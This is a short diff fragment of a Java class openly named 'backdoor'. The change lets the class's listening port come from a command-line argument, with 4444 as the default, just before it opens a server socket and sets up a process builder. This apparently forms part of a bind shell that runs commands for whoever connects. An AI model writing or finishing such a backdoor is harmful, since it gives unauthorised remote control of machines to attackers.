@@ -6,8 +6,8 @@ public class backdoor {
 
 	public static void main(String[] args){
 		try{
-
-			int serverPort = 4444;
+			final int serverPort = args.length == 1 ? Integer.valueOf(args[0]) : 4444;
+			
 			ServerSocket serverSocket = new ServerSocket(serverPort);
 			ProcessBuilder processBuilder = new ProcessBuilder();
 
